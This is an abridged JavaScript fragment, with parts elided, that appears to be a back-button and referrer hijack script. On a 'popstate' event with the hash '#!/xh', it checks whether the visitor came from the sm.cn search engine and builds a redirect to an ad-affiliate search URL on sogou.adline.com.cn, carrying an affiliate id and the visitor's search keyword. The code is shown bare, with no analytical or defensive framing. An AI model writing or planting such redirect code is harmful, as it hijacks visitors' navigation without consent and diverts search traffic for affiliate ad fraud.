(function() {
    var s_key = 'FFA1DYVO';
    var s_name = 'FP434V';
    var bd_arrs = ["1023686s"];
    var sg_name = "Sg";
    var sg_num = "bd7acfec0ba60141e17d5be8e6806686";
    var sg_times = 30;
        ...
        window.addEventListener('popstate', function() {
            if (location.hash == '#!/xh') {
                ...
                if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
					...
					href = "http://sogou.adline.com.cn/search?bid=bd7acfec0ba60141e17d5be8e6806686&keyword="+sg_regex.exec(ref)[1];
                    n = sg_name;
                    t = sg_times
